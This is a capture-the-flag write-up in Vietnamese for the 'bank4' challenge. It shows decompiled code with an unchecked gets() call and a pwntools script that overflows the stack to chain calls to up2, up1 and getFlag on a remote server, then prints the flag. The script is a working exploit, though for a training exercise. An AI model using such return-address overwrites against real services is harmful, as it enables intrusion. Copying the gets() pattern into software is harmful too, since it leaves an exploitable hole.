# bank4
## Đề bài
```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch]
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n");
}

void getFlag()
{
  if ( o1 && o2 )
    system("cat flag.txt");
  else
    system("echo \"hcmasd-cft{nah_nah_nah_not_today}\"");
}

void __cdecl up1(int arg1, int arg2)
{
  if ( o2 && arg1 == 0x1337 && arg2 == 0xDEAD )
    o1 = 1;
}

void __cdecl up2(int arg1, int arg2, int arg3)
{
  if ( arg1 == arg2 && arg3 == 0x12345678 )
    o2 = 1;
}
```

```asm
.text:080488DB ; void __cdecl up2(int arg1, int arg2, int arg3)
.text:080488DB                 public up2
.text:080488DB up2             proc near
.text:080488DB
.text:080488DB arg1            = dword ptr  8
.text:080488DB arg2            = dword ptr  0Ch
.text:080488DB arg3            = dword ptr  10h
.text:080488DB
.text:080488DB ; __unwind {
.text:080488DB                 push    ebp
.text:080488DC                 mov     ebp, esp
.text:080488DE                 call    __x86_get_pc_thunk_ax
.text:080488E3                 add     eax, 9171Dh
.text:080488E8                 mov     edx, [ebp+arg1]
.text:080488EB                 cmp     edx, [ebp+arg2]
.text:080488EE                 jnz     short loc_8048903
.text:080488F0                 cmp     [ebp+arg3], 12345678h
.text:080488F7                 jnz     short loc_8048903
.text:080488F9                 mov     ds:(o2 - 80DA000h)[eax], 1
.text:08048903
.text:08048903 loc_8048903:                            ; CODE XREF: up2+13↑j
.text:08048903                                         ; up2+1C↑j
.text:08048903                 nop
.text:08048904                 pop     ebp
.text:08048905                 retn


.text:08048906                 public getFlag
.text:08048906 getFlag         proc near
.text:08048906
.text:08048906 var_4           = dword ptr -4
.text:08048906
.text:08048906 ; __unwind {
.text:08048906                 push    ebp
.text:08048907                 mov     ebp, esp
.text:08048909                 push    ebx
.text:0804890A                 sub     esp, 4
.text:0804890D                 call    __x86_get_pc_thunk_ax
.text:08048912                 add     eax, 916EEh
.text:08048917                 mov     edx, ds:(o1 - 80DA000h)[eax]
.text:0804891D                 test    edx, edx
.text:0804891F                 jz      short loc_8048941
.text:08048921                 mov     edx, ds:(o2 - 80DA000h)[eax]
.text:08048927                 test    edx, edx
.text:08048929                 jz      short loc_8048941
.text:0804892B                 sub     esp, 0Ch
.text:0804892E                 lea     edx, (aCatFlagTxt - 80DA000h)[eax] ; "cat flag.txt"
.text:08048934                 push    edx
.text:08048935                 mov     ebx, eax
.text:08048937                 call    system
.text:0804893C                 add     esp, 10h
.text:0804893F                 jmp     short loc_8048955
.text:08048941 ; ---------------------------------------------------------------------------
.text:08048941
.text:08048941 loc_8048941:                            ; CODE XREF: getFlag+19↑j
.text:08048941                                         ; getFlag+23↑j
.text:08048941                 sub     esp, 0Ch
.text:08048944                 lea     edx, (aEchoHcmasdCftN - 80DA000h)[eax] ; "echo \"hcmasd-cft{nah_nah_nah_not_today"...
.text:0804894A                 push    edx
.text:0804894B                 mov     ebx, eax
.text:0804894D                 call    system
.text:08048952                 add     esp, 10h
.text:08048955
.text:08048955 loc_8048955:                            ; CODE XREF: getFlag+39↑j
.text:08048955                 nop
.text:08048956                 mov     ebx, [ebp+var_4]
.text:08048959                 leave
.text:0804895A                 retn


.text:080488A5 ; void __cdecl up1(int arg1, int arg2)
.text:080488A5                 public up1
.text:080488A5 up1             proc near
.text:080488A5
.text:080488A5 arg1            = dword ptr  8
.text:080488A5 arg2            = dword ptr  0Ch
.text:080488A5
.text:080488A5 ; __unwind {
.text:080488A5                 push    ebp
.text:080488A6                 mov     ebp, esp
.text:080488A8                 call    __x86_get_pc_thunk_ax
.text:080488AD                 add     eax, 91753h
.text:080488B2                 mov     edx, ds:(o2 - 80DA000h)[eax]
.text:080488B8                 test    edx, edx
.text:080488BA                 jz      short loc_80488D8
.text:080488BC                 cmp     [ebp+arg1], 1337h
.text:080488C3                 jnz     short loc_80488D8
.text:080488C5                 cmp     [ebp+arg2], 0DEADh
.text:080488CC                 jnz     short loc_80488D8
.text:080488CE                 mov     ds:(o1 - 80DA000h)[eax], 1
.text:080488D8
.text:080488D8 loc_80488D8:                            ; CODE XREF: up1+15↑j
.text:080488D8                                         ; up1+1E↑j ...
.text:080488D8                 nop
.text:080488D9                 pop     ebp
.text:080488DA                 retn
```

- Dễ thấy muốn gọi được lệnh `system("Cat flag.txt")` thì cần phải set được 2 biến `o1` và `o2` thành `1`
- Vì hàm `up1` cần điều kiện là biến `o2` phải là `1`, nên cần nhảy tới hàm `up2` trước, tuy nhiên vì hàm `up2` kiểm tra 3 arguments, nên cần ghi đè các giá trị này. Sau đó tiếp tục ghi đè giá trị của return address để tiếp tục nhảy về `Register`. Làm tương tự với hàm `up1`, nhưng ghi đè return address của hàm `up1` thành `getFlag`
```python3
from pwn import *

r = remote('61.28.237.24', 30205)

print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x080488DB) # jump to up2
payload += p32(0x0804895B) # jump to Register
payload += p32(0x1337) # argument 1
payload += p32(0x1337) # argument 2
payload += p32(0x12345678) # argument 3
r.sendline(payload)

# continue to set up1
print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x080488A5) # jump to up1
payload += p32(0x08048906) # jump to get flag
payload += p32(0x1337) # argument 1
payload += p32(0xDEAD) # argument 2
r.sendline(payload)
print(r.recvline())
print(r.recvall())
```
Flag: HCMUS-CTF{trungdeptrai}